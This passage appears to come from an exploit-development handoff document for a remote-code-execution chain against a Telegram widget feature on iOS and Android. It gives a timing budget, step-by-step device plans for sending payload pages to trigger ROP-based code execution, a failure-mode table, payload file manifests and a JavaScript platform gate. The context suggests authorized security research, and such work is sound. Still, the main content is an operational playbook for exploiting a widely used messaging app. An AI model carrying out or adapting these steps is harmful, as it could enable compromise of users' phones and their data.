`logs/host_matrix.txt` is the full transcript. The iOS 27 final on the host
stops at `LEN_72` because the stage-B heap model is iOS-specific; the device
proof is message 5725, not the host.

## 11. Timing budget — 5725 bounds and the 2–3 s target

Measured:

* Host chain: **0.047 ms p50 / 0.060 ms p95** for P3 parse -> map -> cached dry
  send (300 runs). The `sendWidget` API round trip is the network part
  (~100–170 ms on the answer channel, Android measurement; same beta API).
* Host stage A lower bound: the timed miss twin ran **375 attempts in 517 ms**
  (host 8 MiB model); the 5725 hit was 106 attempts, so a device stage A of
  ~0.3–1.0 s is plausible; the device is slower than the host.
* 5725 screenshot bounds: the v8 burst (16:26:16) and w8 burst (16:27:06) both
  show a widget result within **<=2 s of the message send** (screenshot
  cadence ~1.2 s). The `ss8_final` build is 16:27:33.75; the proof was read at
  16:28:57, i.e. **send-to-proof <=5.1 s** (the exact send time is not logged).

Model (seconds; `inferred` where not directly measured):

| segment | fast | slow | source |
|---|---:|---:|---|
| detector bind + safe probe + request | 0.10 | 0.30 | host safe probe 1.6 ms; device overhead |
| request -> bot long-poll | 0.05 | 0.30 | inferred |
| host parse+map+ACK | 0.00005 | 0.0001 | measured |
| `sendWidget` API RT | 0.10 | 0.17 | Android answer RT |
| final Telegram delivery + bind | 0.50 | 1.50 | inferred; 5725 <=2 s |
| final stage A self-sweep | 0.30 | 1.00 | host 0.52 s / 375 attempts |
| inline ROP + write + `pthread_exit` | 0.01 | 0.05 | stage-B host ms |
| **two-phase total** | **1.06** | **3.32** | |
| **direct final (no detector)** | **0.81** | **2.55** | hot path |

**Where 2–3 s is achievable:** the direct one-message final is the hot path
(inline ROP, no answer fetch); it meets 2–3 s if Telegram delivery+bind is
<=1.5 s and stage A <=1.0 s. The two-phase adds one detector delivery, so it
is 2–3.5 s nominal and can exceed 3 s when the second delivery is slow. Use
the detector for an unknown platform/chat or a stale `last_m`; for a known 17e
chat, send the canonical `final_ios27.html` directly and keep the detector as
the fallback/telemetry path. The device `T0_final - t_rep` (timed run) and
`T1-T0` decide the claim; do not quote host numbers as device latency.

## 12. Device plan (live operations stay with the orchestrator)

### 12.1 iPhone 17e / iOS 27.0 24A437

1. Clean the <BOT_USERNAME> chat (no old payloads); keep it at the bottom,
   open. One payload per message; delete after reading.
2. Send `ios27/detector_ios27.html` via the beta `sendWidget` (`height=50`,
   `allow_queries`, `background_query`). Expect `DET SAFE P3…` and a
   `widget_query` with `data=P3…` within ~0.5 s. If the answer channel is
   unavailable, OCR the `#v` report and feed it to
   `bot_two_phase.py --manual-report <P3> --chat <id>`.
3. Host `bot_two_phase.py` (one `getUpdates` consumer) ACKs `K` and sends
   `ios27/final_ios27_m768.html` (or `final_ios27.html` if `last_m` is unset)
   after the 3 s cooldown. Same chat, height 50.
4. Capture the final’s `#v` in a fast burst (the current CoreDevice shots are
   ~1.2 s apart; use 8–12 at ~0.3 s if the tool allows) and/or the app
   console. Expect `RESULT SS2 … HIT=545 LEN=327744 PH=12 VK=598 NT=…`; on a
   hit the marker may stay at `R<ri> M=<M> h=545` because the ROP
   `pthread_exit`s. Check `<AppGroup>/rce.txt` = 7 bytes `RCE_OK\n`
   (sha256 `704984d9…`); app alive.
5. On `HIT=-1` (safe miss): wait 3 s, re-send the final (new heap) or try a
   different `final_ios27_m<M>`; the final is a safe miss. Do **not** send the
   old univA probe as the fallback.
6. On `S:U_NF…` / `NO_FREE` / `NO_BASE`: record the marker; the stage A is
   proven. The AppGroup/offsets are per install; rebuild S2 with the current
   AppGroup (operator).
7. Timing run (one): replace the final with `final_ios27_timed.html`; read
   `T0/T1` and the detector `t_rep`; delivery = `T0_final - t_rep` (24-bit
   device clock), execution = `T1-T0`. Then revert to the canonical final.
8. Acceptance: `RCE_OK\n` sha256 `704984d9…`, app alive, delivery gap recorded,
   total <=3 s for the direct hot path.

### 12.2 iPhone 6s / iOS 15.8.8

1. Send `ios15/at_probe_h400.html`; read `#v`:
   `HIT=545 LEN=327744 PH=36 VK=598 NT=21`.
2. Relay: `python3 relay_ios15.py --marker "<marker>"` -> P3; then
   `bot_two_phase.py --manual-report <P3> --chat <id> --live` sends
   `ios15/at_final_h400.html`.
3. On a miss: H order 400 -> 200 -> 64 -> 500 (probe then final at the same
   H). The attribute final is device-pending; if it fails/crashes, fall back
   to the proven `srop.js` + `ls_final_h200_2036.html` DB-rewrite path and the
   `<APP_UUID>/Documents/rce.txt` proof.
4. Acceptance: `RCE_OK` in the 6s Documents; app alive; the attribute final is
   recorded as device-pending until this run.

### 12.3 Android (unchanged chain, P3 report)

Sony XQ-BT52 beta 72929 first, Pixel 9 72801 second, Samsung on arrival.
Send `detector.html` (beta build for Sony); `DET HIT` -> `final_inline.html`
(release/beta CMD); `DET MISS` -> `final_fallback.html` (8 x 1,000 B answer
chain). Acceptance: `HF OK`, `T1_final - T0_det <=3 s`, first route2-on-Sony
datum; Pixel is the route2-proven device.

## 13. Failure modes

| marker / log | meaning | action |
|---|---|---|
| `DET SAFE P3…` + final `HIT=545` | iOS 27 fast path | read `rce.txt`, record T0/T1 |
| iOS 27 `HIT=-1` | stage-A self-sweep missed; no forge | safe; wait 3 s, re-send final / different M |
| iOS 27 hit + `S:U_NF…` | UB leak/scan failed | stage A proven; retry; report D |
| iOS 27 `NO_FREE` / `NO_BASE` | rt/js_free/base resolver failed | report marker; AppGroup/offsets stale |
| app dies after a hit without `pthread_exit` | class-64 header teardown abort | expected; the final must exit via the ROP |
| `DET` but no host send | 3 s cooldown / answer rate limit | re-open after 3 s; or manual-report |
| iOS 27 no `widget_query` | answer channel pacing (1/5 s) | OCR `#v`, `--manual-report` |
| final >3 s | Telegram delivery >1.5 s | use the direct final; record the gap |
| `rce.txt` absent | AppGroup/install UUID changed | rebuild S2 with the current AppGroup |
| 6s probe miss | H is heap-state dependent | H200/64/500; fallback srop path |
| `WIDGET_RESULT_TOO_LARGE` / >4 KB | zlib9 over 4,096 | re-run the generator; never hand-edit |
| Android `DET MISS` | 9.2-KB shape not certified | fallback answer chain; re-open |

## 14. Files (canonical)

```
ios27/final_ios27.html              8,647 / 3,680 / bf31f2f6…  (5725 proof; pre-redaction)
ios27/detector_ios27.html           1,581 /   804 / 609b7180…  (safe handshake)
ios27/final_ios27_m<M>.html        8,647 / 3,680-3,684 (15 pad-first variants; pre-redaction)
ios27/final_ios27_timed.html        8,807 / 3,716 / 39b567ea…  (timing only; pre-redaction)
ios27/final_ios27_timed_miss.html   8,803 / 3,714 / cadfa07c…  (host miss; pre-redaction)
ios27/PAYLOADS.json                 full raw/zlib9/sha for every iOS 27 file
ios27/old/final_ios27_univA.html    6,295 / 2,481 (not the 5725 payload)
ios15/at_probe_h<H>.html            6,801 / 1,050-1,051 (probe H400 device-proven)
ios15/at_final_h<H>.html            6,801 / 2,527-2,528 (attribute final, pending)
ios27/probe_fallback.html           2,641 / 1,015 (diagnostic only)
gen_ios27_safe.py                   iOS 27 generator (final copy, detector, variants, timed)
gen_two_phase.py                    Android generator (P3 detector)
bot_two_phase.py                    P3/P2 parser + mapping + sendWidget + chunks
relay_ios15.py                      6s marker -> P3
platforms.json                      platform/chain table (1/2/3)
devices.example.json                per-uid platform/last_m/prefer prior
sim_timing.py                       host chain + segment budget
run_host.sh                         full host matrix
```

The repo copies live under `tg-rce/docs/` and `tg-rce/payloads/two_phase/`.
For the current post-redaction iOS 27 page use
`payloads/ios27_rel/p0_proven.html`; for the gated twin use
`payloads/two_phase/ios27_gated/final_ios27.html`. The lab remains the source
of truth for the dated run artifacts.

---

## 15. Desktop gate (withdrawn 2026-11-08)

**The earlier claim "every payload is a no-op on Telegram Desktop" is
withdrawn.** The host matrix tested simulated environments. The real desktop
client is not one of them.

### 15.1 Old gate

The gated files in `payloads/two_phase/` start with:

```js
var GD=1;
if (U.length<40 && U.indexOf('TelegramWidget')>=0
    && typeof __twReceive=='undefined' && typeof __hostOps=='undefined'
    && typeof webkit=='undefined' && S<=800
    && ((C.bottom||0)+(C.cornerLeft||0)+(C.cornerRight||0)>0
        || (devicePixelRatio||1)>=2)) GD=0;
```

The `DPR >= 2` term is true in real Telegram Desktop (DPR 2.0 in the test).
The detector therefore reached its desktop branch and reported
`platform=9`; the host policy skipped the final. That is a host-side skip,
not a payload guard. If a final page is opened directly, the same prefix
passes and stage A runs.

### 15.2 Measured environments

| Field | Telegram Desktop (Windows) | Sony XQ-BT52 sandbox |
|---|---|---|
| `navigator.maxTouchPoints` | `0` | `0` |
| pointer | fine; no coarse pointer | fine; no coarse pointer |
| `navigator.userAgent` | shared `TelegramWidget` UA | same |
| `navigator.platform` | shared platform | same |
| `devicePixelRatio` | `2.0` | `2.6` |
| screen | `430x300` | `389x300` |

The `maxTouchPoints > 0` gatefix was tested as the alternative:

- Telegram Desktop: `MT=0`, blocked.
- Sony XQ-BT52: `MT=0`, **also blocked**.

There is no JS-visible discriminator in this set. A gate built from the shim
fields is a heuristic, not an isolation boundary.

### 15.3 Correct boundary

Use account isolation: send and open the payload only in the test account, and
do not open that chat in Telegram Desktop. Keep `platforms.json` row 9
(`do_not_send_final`) as an operator guard, but do not call it a security
control.

### 15.4 Gated files (post-redaction)

These are host-only. The page lengths differ from the device-proven pages.

| file | raw | zlib9 | sha256 (16) |
|---|---:|---:|---|
| `detector.html` | 9,185 | 1,641 | `ba0638228881234b` |
| `final_inline.html` | 9,185 | 4,068 | `f8bba65829439034` |
| `final_fallback.html` | 2,620 | 1,261 | `f30cacb2b5701c7c` |
| `ios15_gated/at_probe_h400.html` | 7,263 | 1,299 | `28ff3fa228aaaa9e` |
| `ios15_gated/at_final_h400.html` | 7,263 | 2,775 | `fd49cee5f1a9d061` |
| `ios27_gated/detector_ios27.html` | 2,540 | 1,067 | `5098d73fa8ea8bd0` |
| `ios27_gated/final_ios27.html` | 9,139 | 3,915 | `01b38c7188a180cf` |

The iOS 27 gated final is 9,139 B, not the 8,647 B device-proven page. The
earlier handoff hashes (`41f9e6c3…`, `73c4a148…`) are pre-redaction values.
The current manifest is `docs/PAYLOAD_HASHES.json`.

### 15.5 Android beta path and timing

The repo `final_inline.html` writes the release package path
`/data/data/org.telegram.messenger/files/n1`. The Sony certification app is
`org.telegram.messenger.beta`. The live two-phase run used a beta rebuild:
9,190 raw / 4,071 zlib9 (sha256 `8b8ccc13…`), which is 5 bytes longer than the
release page and only 25 B under the 4,096 limit.

Measured on the Sony: detector reported in 63 ms; the host sent the final in
145 ms; the final stage A forged, then the endgame returned `HF ERR NA` (no
anchor). The app stayed alive and no proof file was written. This is a
stage-A success plus endgame failure, not an RCE.

On beta **72979** the same package hit stage A `ABLEN[599]=327744 ATT=1` and
the endgame returned `HF ERR NOANCHOR VNC=0 VO=-1`; there was no `n1` and the
app stayed alive. The detector reported `platform=1 chain=1 hit=1 att=0
sel=599 dpr=2.6 scr=389x300 el=54ms`; a normal `PING` reached the host. The
widget now runs in
`org.telegram.messenger.beta:widgets:org.telegram.utils.twidget.WidgetEngineService`,
UID 99017, `u:r:isolated_app:s0`. That process has no app-private data access
and no network permissions, so the app-data write and the C2 are blocked even
after an anchor fix. 72979 is a mitigation of impact, not a parser fix. The
app-level Android proof remains 72929.

The current beta **72989** keeps the same isolated model at UID **99024**
(`u:r:isolated_app:s0`). `PING` works; the v3 detector reports `el=55ms`; the
v3 final is 9,190 B / 4,081 zlib9; app alive, no crash; the endgame is the same
`HF ERR NOANCHOR`; the isolated process still blocks `n1` and C2. The 72979
isolation facts apply unchanged.

### 15.6 What remains valid

- Host gate matrix: a unit test of the gate logic, not a desktop proof.
- `platforms.json` row 9: an operator policy.
- Gated payloads: host-only until a device re-test.
- Payload bytes are unchanged in this commit. Any gate change needs a device
  re-test and a new zlib measurement.

See `docs/HANDOFF_desktop_gate_20261108.md` and
`docs/CRITIQUE_20261108.md` P0-03.
